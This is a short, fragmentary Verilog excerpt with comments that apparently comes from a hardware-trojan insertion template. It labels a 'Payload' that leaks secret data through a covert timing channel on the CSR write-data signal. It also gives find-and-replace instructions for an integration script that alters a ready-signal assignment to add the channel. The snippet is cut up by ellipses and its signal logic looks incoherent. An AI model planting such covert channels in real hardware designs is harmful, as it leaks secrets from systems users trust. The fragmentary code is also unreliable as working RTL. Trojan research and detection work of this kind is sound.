 ...
 * Payload: Modulate timing of csr_wdata_i based on secret data
 * 
...
assign secret_bit = csr_wdata_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of csr_wdata_i
//
// Integration Script Must Modify:
//
// IF csr_wdata_i is timing-sensitive:
//   Find: assign csr_wdata_i = ready_signal;
//   Replace: assign csr_wdata_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
